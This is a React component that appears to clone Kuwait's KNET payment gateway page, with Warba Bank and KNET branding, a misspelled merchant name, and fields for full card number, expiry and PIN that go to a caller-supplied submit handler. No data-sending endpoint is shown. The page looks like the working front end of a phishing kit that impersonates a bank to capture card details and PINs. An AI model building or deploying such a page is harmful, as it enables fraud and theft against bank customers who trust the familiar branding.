'use client';

import React, { useState, useRef } from 'react';

interface Card {
  id: string;
  last4: string;
  bank: string;
}

const SAMPLE_CARDS: Card[] = [
  { id: '1', last4: '403622', bank: 'ABK' },
  { id: '2', last4: '423826', bank: 'ABK' },
  { id: '3', last4: '42403256', bank: 'ABK' },
  { id: '4', last4: '428628', bank: 'ABK' },
];

interface PaymentFormProps {
  amount: string;
  onSubmit: (cardData: any) => void;
  isLoading?: boolean;
}

export default function KNetPaymentForm({
  amount,
  onSubmit,
  isLoading = false,
}: PaymentFormProps) {
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [pin, setPin] = useState('');
  const [selectedCard, setSelectedCard] = useState<Card | null>(null);
  const [showDropdown, setShowDropdown] = useState(false);
  const dropdownRef = useRef<HTMLDivElement>(null);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit({
      cardNumber: selectedCard?.last4 || cardNumber,
      expiry,
      pin,
    });
  };

  const handleCardSelect = (card: Card) => {
    setSelectedCard(card);
    setCardNumber(card.last4);
    setShowDropdown(false);
  };

  return (
    <div style={styles.container}>
      {/* Top Banner */}
      <div style={styles.banner}>
        <div style={styles.bannerTitle}>زكــن على رؤيـــة</div>
        <div style={styles.bannerSubtitle}>الاحتيال له عدة أشكال وأنواع</div>
      </div>

      {/* Merchant Section */}
      <div style={styles.panel}>
        <div style={styles.bankHeader}>
          <div style={styles.bankName}>بنك ورقة</div>
          <div style={styles.bankEnglish}>WARBA BANK</div>
        </div>

        <div style={styles.infoRow}>
          <span style={styles.label}>Merchant:</span>
          <span style={styles.value}>Myfatoorah General Trading Co. (Myfatoorash)</span>
        </div>
        <div style={styles.divider}></div>

        <div style={styles.infoRow}>
          <span style={styles.label}>Amount:</span>
          <span style={styles.value}>KD {amount}</span>
        </div>
      </div>

      {/* Payment Form */}
      <div style={styles.panel}>
        {/* Card Number Section */}
        <div style={styles.formGroup}>
          <label style={styles.fieldLabel}>Card Number:</label>
          <div style={styles.cardDropdownWrapper} ref={dropdownRef}>
            <input
              type="text"
              placeholder="4"
              value={cardNumber}
              onChange={(e) => {
                setCardNumber(e.target.value);
                setShowDropdown(true);
              }}
              onFocus={() => setShowDropdown(true)}
              style={styles.cardNumberInput}
            />
            {showDropdown && (
              <div style={styles.cardDropdown}>
                {SAMPLE_CARDS.map((card) => (
                  <div
                    key={card.id}
                    style={styles.cardOption}
                    onClick={() => handleCardSelect(card)}
                  >
                    <span>{card.last4} - {card.bank}</span>
                    <span style={styles.bankIcon}>🏦</span>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>

        <div style={styles.divider}></div>

        {/* Expiration Date */}
        <div style={styles.formGroup}>
          <label style={styles.fieldLabel}>Expiration Date:</label>
          <input
            type="text"
            placeholder="MM/YY"
            value={expiry}
            onChange={(e) => setExpiry(e.target.value)}
            style={styles.input}
            maxLength={5}
          />
        </div>

        <div style={styles.divider}></div>

        {/* PIN */}
        <div style={styles.formGroup}>
          <label style={styles.fieldLabel}>PIN:</label>
          <input
            type="password"
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            style={styles.input}
            maxLength={4}
          />
        </div>
      </div>

      {/* Buttons */}
      <div style={styles.panel}>
        <div style={styles.buttonGroup}>
          <button
            onClick={handleSubmit}
            disabled={isLoading}
            style={styles.submitButton}
          >
            Submit
          </button>
          <button
            type="button"
            style={styles.cancelButton}
            onClick={() => {
              setCardNumber('');
              setExpiry('');
              setPin('');
              setSelectedCard(null);
              setShowDropdown(false);
            }}
          >
            Cancel
          </button>
        </div>
      </div>

      {/* Footer */}
      <div style={styles.footer}>
        <p style={styles.footerText}>All Rights Reserved. Copyright 2026 ©</p>
        <p style={styles.knetText}>
          The Shared Electronic Banking Services Company - KNET
        </p>
      </div>
    </div>
  );
}

const styles: { [key: string]: React.CSSProperties } = {
  container: {
    maxWidth: '500px',
    margin: '0 auto',
    padding: '12px',
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif',
    backgroundColor: '#f5f5f5',
  },
  banner: {
    backgroundColor: '#5b8db5',
    color: '#fff',
    padding: '16px',
    borderRadius: '12px',
    textAlign: 'center',
    marginBottom: '16px',
  },
  bannerTitle: {
    fontSize: '20px',
    fontWeight: 'bold',
    direction: 'rtl' as const,
    marginBottom: '4px',
  },
  bannerSubtitle: {
    fontSize: '14px',
    direction: 'rtl' as const,
  },
  panel: {
    backgroundColor: '#fff',
    borderRadius: '16px',
    padding: '16px',
    marginBottom: '12px',
    boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
  },
  bankHeader: {
    display: 'flex',
    flexDirection: 'column' as const,
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: '16px',
    paddingBottom: '12px',
    borderBottom: '2px solid #f0f0f0',
  },
  bankName: {
    fontSize: '20px',
    fontWeight: 'bold',
    color: '#2b6fb3',
    marginBottom: '4px',
  },
  bankEnglish: {
    fontSize: '14px',
    color: '#2b6fb3',
    fontWeight: '600',
  },
  infoRow: {
    display: 'flex' as const,
    justifyContent: 'space-between' as const,
    alignItems: 'center' as const,
    marginBottom: '12px',
    fontSize: '14px',
  },
  label: {
    fontWeight: 'bold',
    color: '#2b6fb3',
    minWidth: '100px',
  },
  value: {
    color: '#333',
    textAlign: 'right' as const,
    flex: 1,
  },
  divider: {
    height: '1px',
    backgroundColor: '#e0e0e0',
    margin: '12px 0',
  },
  formGroup: {
    marginBottom: '12px',
  },
  fieldLabel: {
    display: 'block',
    fontWeight: 'bold',
    color: '#2b6fb3',
    marginBottom: '6px',
    fontSize: '14px',
  },
  cardDropdownWrapper: {
    position: 'relative' as const,
  },
  cardNumberInput: {
    width: '100%',
    padding: '10px',
    border: '1px solid #d0d0d0',
    borderRadius: '6px',
    fontSize: '14px',
    backgroundColor: '#f8f8f8',
    boxSizing: 'border-box' as const,
  },
  cardDropdown: {
    position: 'absolute' as const,
    top: '100%',
    left: 0,
    right: 0,
    backgroundColor: '#fff',
    border: '1px solid #d0d0d0',
    borderRadius: '6px',
    marginTop: '2px',
    boxShadow: '0 4px 6px rgba(0, 0, 0, 0.1)',
    zIndex: 100,
  },
  cardOption: {
    padding: '10px 12px',
    borderBottom: '1px solid #f0f0f0',
    display: 'flex' as const,
    justifyContent: 'space-between' as const,
    alignItems: 'center' as const,
    cursor: 'pointer',
    fontSize: '13px',
    color: '#333',
  },
  bankIcon: {
    fontSize: '12px',
    color: '#2b6fb3',
  },
  input: {
    width: '100%',
    padding: '10px',
    border: '1px solid #d0d0d0',
    borderRadius: '6px',
    fontSize: '14px',
    backgroundColor: '#f8f8f8',
    boxSizing: 'border-box' as const,
  },
  buttonGroup: {
    display: 'flex' as const,
    gap: '12px',
    marginTop: '8px',
  },
  submitButton: {
    flex: 1,
    padding: '12px',
    backgroundColor: '#e8e8e8',
    border: '1px solid #d0d0d0',
    borderRadius: '6px',
    fontWeight: '600',
    fontSize: '14px',
    cursor: 'pointer',
    color: '#333',
  },
  cancelButton: {
    flex: 1,
    padding: '12px',
    backgroundColor: '#e8e8e8',
    border: '1px solid #d0d0d0',
    borderRadius: '6px',
    fontWeight: '600',
    fontSize: '14px',
    cursor: 'pointer',
    color: '#333',
  },
  footer: {
    textAlign: 'center' as const,
    fontSize: '12px',
    color: '#666',
    marginTop: '24px',
    paddingBottom: '20px',
  },
  footerText: {
    margin: '0 0 4px 0',
  },
  knetText: {
    color: '#2b6fb3',
    fontWeight: '600',
    margin: '4px 0 0 0',
  },
};
